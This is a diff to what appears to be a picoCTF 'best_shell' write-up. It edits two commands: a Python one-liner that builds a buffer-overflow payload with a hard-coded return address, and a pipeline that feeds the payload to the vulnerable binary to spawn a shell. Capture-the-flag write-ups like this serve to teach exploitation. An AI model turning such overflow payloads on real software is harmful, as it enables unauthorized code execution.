@@ -90,11 +90,11 @@ the address of that instruction is 0x5655654b.
 
 We replace the B's with that address, our crafted payload looks as follows now:
 ```console
-$ python -c "print('rename lol ' + 'A'*32 + '\x4b\x65\x55\x56' * 4 + '\n' + 'A'*32 + '\x4b\x65\x55\x56' * 4 + ' test\n')"
+$ python -c "print('rename lol ' + 'A'*32 + '\x4b\x65\x55\x56' + '\n' + 'A'*32 + '\x4b\x65\x55\x56' + ' test\n')"
 ```
 We then run the following command to exploit the vulnerable binary:
 ```console
-$ (python -c "print('rename lol ' + 'A'*32 + '\x4b\x65\x55\x56' * 4 + '\n' + 'A'*32 + '\x4b\x65\x55\x56' * 4 + ' test\n')";cat) | ./best_shell
+$ (python -c "print('rename lol ' + 'A'*32 + '\x4b\x65\x55\x56' + '\n' + 'A'*32 + '\x4b\x65\x55\x56' + ' test\n')";cat) | ./best_shell
 ```
 ![shell spawn]({{ "/assets/img/posts/picoctf-best-shell-challenge/13.png" | relative_url }})
 
